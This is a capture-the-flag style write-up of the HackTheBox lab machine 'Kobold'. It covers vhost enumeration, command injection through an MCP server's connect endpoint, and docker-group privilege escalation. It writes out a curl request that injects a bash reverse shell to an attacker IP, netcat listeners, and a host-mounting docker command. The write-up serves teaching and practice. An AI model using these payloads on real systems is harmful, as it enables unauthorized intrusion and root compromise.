# HackTheBox — Kobold Write-up

| | |
|---|---|
| **Platform** | HackTheBox |
| **Machine** | Kobold |
| **OS** | Linux |
| **Domain** | `kobold.htb` |
| **Focus** | VHost enumeration, MCP server command injection, Docker group privilege escalation |

> Educational write-up of a HackTheBox lab machine. Replace the attacker IP (`10.10.15.39`) and ports with your own values throughout.

---

## 1. Reconnaissance

Begin with a port scan. The target exposes:

- `22/tcp` — SSH
- `80/tcp` — HTTP
- `443/tcp` — HTTPS
- `3552/tcp` — an additional HTTP service on a non-standard, "random" port

Browsing to the service on port `3552` reveals an **Arcane**-themed web page — the primary application to attack.

Add the domain to `/etc/hosts` so name-based virtual hosts resolve:

```
<target-ip>  kobold.htb
```

---

## 2. Virtual Host Enumeration

Since the site is served over HTTPS with a self-signed/untrusted certificate, fuzz for virtual hosts with Gobuster, ignoring TLS validation:

```bash
gobuster vhost -u "https://kobold.htb" \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  --append-domain --no-tls-validation
```

```
mcp.kobold.htb   Status: 200 [Size: 466]
bin.kobold.htb   Status: 200 [Size: 24402]
```

Two virtual hosts surface:

- **`mcp.kobold.htb`** — an MCP (Model Context Protocol) server endpoint.
- **`bin.kobold.htb`** — a PrivateBin instance.

Add both to `/etc/hosts`.

> **About `--no-tls-validation` (`-k`):** this flag tells the tool to ignore untrusted, expired, or self-signed certificate warnings and scan anyway. It's fine for saving time in a lab, but note that in a real-world external pentest or compliance audit, *checking* for broken/invalid TLS configuration is itself part of the engagement, so don't blindly suppress it there.
>
> **What a TLS/SSL certificate is:** a digital file on the web server providing two things — **encryption** of traffic and **authentication** of the server's identity.

---

## 3. Foothold — MCP Server Command Injection

The `mcp.kobold.htb` host runs an **MCP server**. Researching MCP server vulnerabilities points to the `/api/mcp/connect` endpoint, which accepts a server configuration specifying a `command` and `args` to launch — with no sanitization. That is direct **command execution**.

### Set up a listener

On the attacker box:

```bash
nc -lvnp 4444
```

### Trigger the reverse shell

Send a crafted MCP connect request whose `command`/`args` spawn a reverse shell back to the listener:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "shell1",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.39/4444 0>&1"],
      "env": {}
    }
  }'
```

The listener catches a shell as the application user (`ben`).

### User flag

With shell access, grab the user flag:

```bash
cat user.txt
```

---

## 4. Privilege Escalation — Docker Group

Enumerate the system for escalation paths.

```bash
sudo -l
# permission denied / no useful sudo rights
```

`sudo` is a dead end, so look elsewhere. Docker is running on the host:

```bash
docker ps
# permission denied while trying to connect to the Docker daemon socket
```

The user `ben` *is listed* in the `docker` group, but the **current shell session** is still running under its primary group (`gid=1001(ben)`). The reverse shell never picked up the supplementary `docker` group, so the kernel blocks access to the Docker control socket (`/var/run/docker.sock`).

### Refresh the group membership

```bash
newgrp docker
```

`newgrp docker` starts a new shell instance in the same terminal and switches the **active** group ID to `docker`. Now the session's token actually belongs to the `docker` group, the socket permissions match, and Docker commands work:

```bash
docker ps
```

### Escape the docker group to root

Membership in the `docker` group is effectively root-equivalent: you can launch a container running as root and mount the host's entire filesystem into it. The PrivateBin image is already present on the box, so no pull is needed.

Set up a second listener:

```bash
nc -lvnp 5555
```

Then, from the `newgrp docker` shell, run a privileged container as root (`-u 0`) that mounts the host root (`/`) into `/mnt` and uses that access to execute as root on the host — for example, dropping a root reverse shell or reading protected files directly:

```bash
docker run --rm -u 0 --entrypoint sh \
  -v /:/mnt \
  privatebin/nginx-fpm-alpine:2.0.2 \
  -c "<root payload operating on /mnt>"
```

Because `/mnt` is the real host filesystem, anything done as root inside the container (writing a SUID binary, adding an SSH key, editing `/mnt/etc/...`, or firing a reverse shell back to port `5555`) executes with full host-root authority.

### Root flag

The second listener receives a root shell, granting access to the root flag:

```bash
cat /root/root.txt
```

---


